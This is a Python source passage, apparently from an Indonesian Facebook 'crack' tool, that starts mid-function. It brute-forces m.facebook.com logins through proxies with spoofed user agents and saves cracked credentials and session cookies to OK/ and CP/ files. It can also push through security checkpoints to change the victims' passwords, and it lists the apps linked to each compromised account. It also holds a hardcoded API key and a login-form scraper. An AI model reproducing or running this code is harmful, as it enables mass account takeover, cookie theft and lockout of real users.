'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

#-----------------------[ DEF CEK OPSI ]--------------------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m [+] "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	print ("%s%s%s%s\33[1;96mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(U,til,O,U,O))
	for file in dirs:
		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\33[1;96mMasukan file [ CTH%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s\33[1;91mFile Tidak Ada'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s\33[1;96mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print(" [+] \33[1;96mIsi Yang Benar ");jeda(2)
		back()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s\33[1;96mNama File %s\033[0m Tidak Tersedia"%(M,til,romi))
	jalan("%s%s%s\33[1;96mMode Pesawatkan Terlebih Dahulu 5 Detik "%(U,til,O))
	pw=input("\n%s%s%s\33[1;96mUbah Sandi Pada Akun One Tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s\33[1;96mMasukan Sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s\33[1;91mSandi Minimal 6 Karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print ("%s%s%s\33[1;96mTotal Akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s\33[1;96mLogin Akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s\33[1;96mSelesai Mengecek Akun"%(U,til,O));jeda(0.07)
	input('%s%s%s[%s\33[1;96m Enter%s ]'%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://m.facebook.com"
	session.headers.update({"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\33[1;96m Akun Terkunci Sesi New"%(M,til))
		else:
			print("\r%s%s\33[1;96m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s %s\33[1;96mterdapat %s%s%s \33[1;96mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\33[1;96mAkun One Tab, Sandi Berhasil Di 🥳🥳 \n [+] OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						cek_apk(kuki)
				else:
					print("\r%s%s \33[1;96mAkun One Tab, Silahkan Anda 🥳🥳		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					cek_apk(kuki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s \33[1;91mAkun Terpasang Autentikasi Dua Faktor			"%(M))
			else:
				print("%s%s\33[1;91mTerjadi Kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s \33[1;96mSelamat Akun Anda Tidak Checkpoint Silahkan Masuk Lewat FB🥳🥳 "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s \33[1;96m %s"%(M,oh))
	else:
		print("%s [+] \33[1;91mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(M))
		  
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    # Main menu #
    
  #  os.system('clear')
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 11; BrayennnFB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 11; BrayennnFB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")

#-----------------------[ DEFF SCRAPT METODE ]--------------------#
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 

def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        print('\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mProgram Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
    except Exception as e:
        print('\n\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;96m Program Selesai Dalam Waktu 0 Detik\n')

class get_data_web:
    
    def __init__(self):
        self.xyz = requests.Session()
        url = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mMasukkan URL : \x1b[1;97m')
        print('\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mSource Payload')
        print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mParsed Payload')
        print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mSource Code Post Requests')
        self.tanya = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mPilih : \x1b[1;97m')
        self.domain = url.split('/')[2]
        self.get_form(url)
       
    def get_form(self,url):
        req = self.xyz.get(url)
        raq = bs(req.content,'html.parser')
        for x in raq.find_all('form'):
            if self.tanya in ['1','01','a']: self.printing1(req,x)
            elif self.tanya in ['2','02','b']: self.printing2(req,x)
            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
            else: exit('\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;91mIsi Yang Benar Asu')

    def get_head1(self,req):
        data = {}
        head = req.headers
        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
        for x,y in zip(head.keys(),head.values()):
            try:
                if x.lower() in usls: continue
                else: data.update({x:y})
            except Exception as e:continue
        return(data)

    def get_data1(self,form):
        data = {}
        for y in form.find_all('input'):
            try:data.update({y['name']:y['value']})
            except Exception as e:continue
        return(data)

    def get_data2(self,form):
        data = []
        for y in form.find_all('input'):
            try:data.append(y)
            except Exception as e:continue
        return(data)

    def get_post1(self,form):
        z = form['action']
        if 'https://'+self.domain in z: return(z)
        elif 'http://'+self.domain in z: return(z)
        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[SOURCE PAYLOAD]\n')
        print('[Host] %s'%(self.domain))
        print('[Head] %s'%(head))
        print('[Data] %s'%(data))
        print('[Coki] %s'%(coki))
        print('[Post] %s'%(post))

    def printing2(self,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[PARSED PAYLOAD]\n')
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print('cookie = {')
        for x,y in zip(coki.keys(),coki.values()):
            print('    %s%s: %s'%(x,' '*(5-len(x)),y))
        print('    }')
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
    def printing3(self,url,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        print('\n\n[SOURCE CODE POST REQUESTS]\n')
        print("url  = '%s'"%(url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    gp = dp.replace(fp,'(.*?)')
                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))
                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print("cookie = requests.Session().cookies.get_dict()")
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

#-----------------------[ SYSTEM-CONTROL ]--------------------#Gak Boleh Di Ubah yg Di bawah Ini kontol
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	login()
  
